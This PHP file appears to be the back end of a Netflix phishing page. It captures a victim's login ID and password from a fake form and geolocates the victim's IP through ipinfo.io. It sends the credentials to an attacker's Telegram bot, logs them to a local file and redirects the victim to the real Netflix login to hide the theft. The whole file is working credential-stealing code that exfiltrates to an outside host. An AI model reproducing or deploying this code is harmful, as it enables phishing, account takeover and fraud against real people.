<?php
/*
 For fun and knowledge, always think out of the box! :)
 Regards,
 leonuz
*/

$client_ip = $_SERVER['REMOTE_ADDR'];

$geo = "N/A";
$city = "N/A";

$ipinfo_data = file_get_contents("http://ipinfo.io/" . $client_ip . "/json");
$ipinfo_data = json_decode($ipinfo_data);

if ($ipinfo_data && isset($ipinfo_data->country) && isset($ipinfo_data->city)) {
    $geo = $ipinfo_data->country;
    $city = $ipinfo_data->city;
}
$date = date("m.d.Y");

$variables_to_record = ["userLoginId", "password"]; 

$message = "";
$message .= "Ransom World \n \n";
$message .= "Site= Netflix \n";
$message .= "Date=" . $date . "\n";
$message .= "IP=" . $client_ip . "\n";
$message .= "Geo=" . $geo . " | " . $city . "\n";

foreach ($variables_to_record as $variable) {
    if (isset($_POST[$variable])) {
        $value = str_replace("\n", "\\n", $_POST[$variable]);
        $message .= $variable . "=" . $value . "\n"; 
    }
}

$token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
$telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";
$id = "XXXXXXXXXXXXXXXXX";

$telegram_data = [
    "chat_id" => $id,
    "text" => $message,
];

$telegram_response = file_get_contents($telegram_api_url . '?' . http_build_query($telegram_data));

$handle = fopen("log.txt", "a");
fwrite($handle, $message . "\n\n\n\n"); 
fclose($handle);
header('Location: https://www.netflix.com/in/login');
exit;
?>

